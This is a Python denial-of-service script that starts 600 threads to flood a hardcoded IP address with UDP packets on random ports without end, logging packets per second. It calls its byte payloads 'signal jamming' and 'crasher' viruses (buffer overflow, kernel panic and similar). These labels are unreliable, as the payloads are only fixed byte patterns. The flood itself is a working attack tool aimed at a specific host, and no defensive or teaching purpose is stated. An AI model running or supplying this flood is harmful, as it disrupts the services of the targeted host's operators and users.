import socket
import threading
import time
import random

# TARGET
target = "62.109.121.42"

# HEAVY SIGNAL JAMMING VIRUS PAYLOADS - FIXED SIZES
VIRUS_JAMMERS = [
    # 1. HIGH-FREQUENCY JAMMER (HFJ) - 64 bytes
    bytes([0x48, 0x46, 0x4A, 0x31] + [random.randint(0x80, 0xFF) for _ in range(60)]),
    
    # 2. LOW-FREQUENCY JAMMER (LFJ) - 64 bytes  
    bytes([0x4C, 0x46, 0x4A, 0x31] + [random.randint(0x00, 0x3F) for _ in range(60)]),
    
    # 3. PATTERN JAMMER (PATJ) - 64 bytes
    bytes([0x50, 0x41, 0x54, 0x4A] + [0xAA, 0x55] * 30),
    
    # 4. CLOCK JAMMER (CLKJ) - 64 bytes
    bytes([0x43, 0x4C, 0x4B, 0x4A] + [0xFF, 0x00] * 30),
    
    # 5. RANDOM NOISE JAMMER (RNJ) - 64 bytes
    bytes([0x52, 0x4E, 0x4A, 0x31] + [random.randint(0, 255) for _ in range(60)]),
    
    # 6. SYNCHRONIZATION JAMMER (SYNJ) - 64 bytes
    bytes([0x53, 0x59, 0x4E, 0x4A] + 
          [0x7E] * 8 + [0x55] * 8 + [0xAA] * 44),
    
    # 7. CARRIER JAMMER (CRRJ) - 64 bytes
    bytes([0x43, 0x52, 0x52, 0x4A] + [0xFF] * 60),
    
    # 8. MODULATION JAMMER (MODJ) - 64 bytes
    bytes([0x4D, 0x4F, 0x44, 0x4A] + [i % 256 for i in range(60)]),
]

# HEAVY CRASHER VIRUS PAYLOADS - FIXED SIZES
VIRUS_CRASHERS = [
    # 1. NULL POINTER CRASHER (NULC) - 64 bytes
    bytes([0x4E, 0x55, 0x4C, 0x43] + [0x00] * 60),
    
    # 2. MAX POINTER CRASHER (MAXC) - 64 bytes
    bytes([0x4D, 0x41, 0x58, 0x43] + [0xFF] * 60),
    
    # 3. BUFFER OVERFLOW CRASHER (BUFC) - 128 bytes
    bytes([0x42, 0x55, 0x46, 0x43] + 
          [0x41] * 100 + 
          [0x90] * 8 + 
          [0xCC] * 8 + 
          [0xEB, 0xFE, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90] +
          [0x42] * (128 - 4 - 100 - 8 - 8 - 8)),
    
    # 4. STACK SMASHING CRASHER (STKC) - 128 bytes
    bytes([0x53, 0x54, 0x4B, 0x43] + 
          [0x43] * 60 + 
          [0x00] * 8 + 
          [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE] +
          [0x44] * (128 - 4 - 60 - 8 - 8)),
    
    # 5. HEAP CORRUPTION CRASHER (HEPC) - 128 bytes
    bytes([0x48, 0x45, 0x50, 0x43] + 
          list(b"HEAPHEAP") + 
          [0x45] * 80 + 
          list(b"FREEFREE") + 
          list(b"MALLOCMA") +
          [0x46] * (128 - 4 - 8 - 80 - 8 - 8)),
    
    # 6. KERNEL PANIC CRASHER (KERC) - 96 bytes
    bytes([0x4B, 0x45, 0x52, 0x43] + 
          list(b"KERNELPA") + 
          list(b"NIC!\x00\x00\x00\x00") + 
          [0x0D, 0xF0, 0xAD, 0x0B, 0x0D, 0xF0, 0xAD, 0x0B] +
          [0xCA, 0xFE, 0xBA, 0xBE, 0xCA, 0xFE, 0xBA, 0xBE] +
          [0x47] * (96 - 4 - 8 - 8 - 8 - 8)),
    
    # 7. DIVIDE BY ZERO CRASHER (DIVC) - 80 bytes
    bytes([0x44, 0x49, 0x56, 0x43] + 
          [0x00] * 8 + 
          [0xFF] * 8 + 
          [0x7F] + [0xFF] * 7 + 
          [0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] +
          [0x48] * (80 - 4 - 8 - 8 - 8 - 8)),
    
    # 8. MEMORY LEAK CRASHER (MEMC) - 128 bytes
    bytes([0x4D, 0x45, 0x4D, 0x43] + 
          list(b"LEAKLEAK") + 
          list(b"ALLOCALL") + 
          list(b"OCNEVERF") + 
          list(b"REEEEEEE") +
          [0x49] * (128 - 4 - 8 - 8 - 8 - 8)),
]

# COMBINE ALL PAYLOADS
VIRUS_PAYLOADS = VIRUS_JAMMERS + VIRUS_CRASHERS

print(f"Loaded {len(VIRUS_JAMMERS)} jammers + {len(VIRUS_CRASHERS)} crashers = {len(VIRUS_PAYLOADS)} total viruses")

# SIMPLE VIRUS ATTACK - NO AUTO-SCALING COMPLEXITY
packets_sent = 0
start_time = time.time()

def virus_attack(thread_id):
    global packets_sent
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Select deadly payload
            payload = random.choice(VIRUS_PAYLOADS)
            
            # Random target port for maximum damage
            port = random.randint(1, 65535)
            
            # LAUNCH VIRUS
            sock.sendto(payload, (target, port))
            packets_sent += 1
            
        except:
            # Recreate socket if broken
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# LAUNCH 600 VIRUS THREADS (FIXED, NO AUTO-SCALE)
print("☢️  MK2-VIRUS LAUNCHING...")
print(f"🎯 Target: {target}")
print(f"💀 Threads: 600")
print(f"🦠 Viruses: {len(VIRUS_PAYLOADS)} types")
print("="*50)

for i in range(600):
    t = threading.Thread(target=virus_attack, args=(i,))
    t.daemon = True
    t.start()

# SIMPLE LOGGING
last_log = time.time()
while True:
    time.sleep(1)
    elapsed = time.time() - last_log
    last_log = time.time()
    
    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
    packets_sent = 0
    
    print(f"☢️  MK2-VIRUS | {pps}/s")
